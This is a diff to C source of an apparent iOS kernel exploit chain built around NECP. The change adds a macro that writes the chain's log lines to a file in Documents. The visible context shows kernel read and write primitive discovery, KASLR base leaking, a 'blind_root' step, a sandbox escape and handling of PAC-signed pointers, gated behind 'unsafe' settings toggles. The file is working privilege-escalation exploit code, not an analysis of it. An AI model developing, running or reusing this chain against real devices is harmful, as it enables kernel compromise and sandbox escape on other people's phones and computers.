@@ -1,4 +1,5 @@
 #include "exploit.h"
+#include "nk_trace.h"
 #include "necp.h"
 #include <CoreFoundation/CFPreferences.h>
 #include <CoreFoundation/CFNumber.h>
@@ -9,6 +10,12 @@ extern int nk_kaslr_candidate_count(void) __attribute__((weak));
 extern uint64_t nk_kaslr_candidate(int i) __attribute__((weak));
 extern void nk_mach_leak_hunt(void) __attribute__((weak));
 extern void nk_crafted_io_hunt(void) __attribute__((weak));
+
+/* Durable log for the chain: Documents/necp_chain.log. The chain is the
+ * only read/write channel we have on 23.55, and its decisions are only
+ * visible in the volatile UI log, which dies with the app. */
+#define CH_LOG(fmt, ...) do { nk_log(fmt, ##__VA_ARGS__); \
+                               nk_doc_log("necp_chain.log", fmt, ##__VA_ARGS__); } while (0)
 
 static int is_kernel_va(uint64_t v);
 static int is_poison(uint64_t v);
@@ -452,18 +459,19 @@ static void derive_base_from_leak(void) {
 
 static int discover_read(void) {
     build_candidates();
-    if (s_n_candidates == 0) { nk_log("[do] no kernel VA candidates"); return -1; }
+    if (s_n_candidates == 0) { CH_LOG("[do] no kernel VA candidates"); return -1; }
     static int refl[DO_MAX_REFL]; int nrefl = 0;
-    nk_log("[do] phase 1: differential reflection map");
+    CH_LOG("[do] phase 1: differential reflection map");
     map_reflected_offsets(refl, &nrefl, DO_MAX_REFL);
-    nk_log("[do] phase 1 done: reflected offsets=%d", nrefl);
+    CH_LOG("[do] phase 1 done: reflected offsets=%d", nrefl);
+    for (int i = 0; i < nrefl; i++) CH_LOG("[do] reflected offset[%d]=0x%x", i, refl[i]);
     if (nrefl == 0) {
-        nk_log("[-] NECP COPY_RESULT independent of reclaimed heap");
-        nk_log("[-] data-only NECP vector dead on 23C55");
+        CH_LOG("[-] NECP COPY_RESULT independent of reclaimed heap");
+        CH_LOG("[-] data-only NECP vector dead on 23C55");
         s_read.valid = 0;
         return -1;
     }
-    nk_log("[do] phase 2: kernel-candidate scoring on reflected offsets");
+    CH_LOG("[do] phase 2: kernel-candidate scoring on reflected offsets, candidates=%d", s_n_candidates);
     static uint8_t tmp_out[DO_OUT_SZ];
     static const uint32_t lens[] = { 0x200, 0x1000 };
     int attempts = 0, max_attempts = 600, best_score = -1;
@@ -499,7 +507,7 @@ static int discover_read(void) {
                             best_cfg.last_addr = cand;
                             memcpy(s_best_leak, tmp_out, n);
                             s_best_leak_len = n;
-                            nk_log("[do READ CAND] cand=0x%016llx ptr_off=0x%x len_off=0x%x len=0x%x uuid=%d score=%d out=%zu",
+                            CH_LOG("[do READ CAND] cand=0x%016llx ptr_off=0x%x len_off=0x%x len=0x%x uuid=%d score=%d out=%zu",
                                    (unsigned long long)cand, ptr_off, len_off, lens[l], uuid_mode, score, n);
                         }
                         if (score >= 10) { s_read.valid = 1; s_read.last_addr = cand; goto done; }
@@ -511,13 +519,13 @@ static int discover_read(void) {
 done:
     if (best_score >= 4) {
         s_read = best_cfg; s_read.valid = 1; g_nk.has_rw = 1;
-        nk_log("[+] read candidate locked: ptr_off=0x%x len_off=0x%x len=0x%x uuid=%d score=%d",
+        CH_LOG("[+] read candidate locked: ptr_off=0x%x len_off=0x%x len=0x%x uuid=%d score=%d",
                s_read.ptr_off, s_read.len_off, s_read.len_val, s_read.uuid_mode, best_score);
         derive_base_from_leak();
         return 0;
     }
     s_read.valid = 0;
-    nk_log("[-] reflected offsets exist but no kernel content: attempts=%d best=%d", attempts, best_score);
+    CH_LOG("[-] reflected offsets exist but no kernel content: attempts=%d best=%d", attempts, best_score);
     return -1;
 }
 
@@ -570,14 +578,14 @@ static int discover_kwrite(void) {
             if (hit) {
                 s_write.valid = 1; s_write.action = action; s_write.ptr_off = ptr_off; s_write.uuid_mode = 1;
                 g_nk.has_kwrite = 1; g_nk.has_rw = 1;
-                nk_log("[+] write primitive: action=0x%02x ptr_off=0x%x r=%ld errno=%d", action, ptr_off, r, errno);
+                CH_LOG("[+] write primitive: action=0x%02x ptr_off=0x%x r=%ld errno=%d", action, ptr_off, r, errno);
                 munmap(probe, 4096);
                 return 0;
             }
         }
     }
     munmap(probe, 4096);
-    nk_log("[-] write primitive not found");
+    CH_LOG("[-] write primitive not found");
     return -1;
 }
 
@@ -696,13 +704,13 @@ static int sandbox_escape(void) {
 
 void nk_dataonly_necp_chain(void) {
     nk_rule();
-    nk_log("[chain] NECP data-only chain v5 (differential oracle)");
-    if (!pref_bool("unsafe_necp_dataonly")) { nk_log("[chain] locked"); nk_rule(); return; }
-    if (ensure_necp() != 0) { nk_log("[chain] NECP unavailable"); nk_rule(); return; }
+    CH_LOG("[chain] NECP data-only chain v5 (differential oracle)");
+    if (!pref_bool("unsafe_necp_dataonly")) { CH_LOG("[chain] locked - enable Settings -> Privilege Escalation -> NECP Data-Only Chain"); nk_rule(); return; }
+    if (ensure_necp() != 0) { CH_LOG("[chain] NECP unavailable"); nk_rule(); return; }
     discover_read();
     if (s_read.valid) {
         if (pref_bool("unsafe_do_kwrite")) discover_kwrite();
-        else nk_log("[do W] locked");
+        else CH_LOG("[do W] locked");
     }
     if (s_read.valid && s_write.valid) {
         blind_root();
@@ -715,7 +723,7 @@ void nk_dataonly_necp_chain(void) {
     } else {
         nk_log("[PAC STORE] no signed-pointer candidates this pass");
     }
-    nk_log("[chain] state: read=%d write=%d root=%d base=0x%llx leaked=%d signed=%d",
+    CH_LOG("[chain] state: read=%d write=%d root=%d base=0x%llx leaked=%d signed=%d",
            s_read.valid, s_write.valid, g_nk.has_root,
            (unsigned long long)g_nk.base, s_n_leaked, s_n_signed);
     nk_rule();
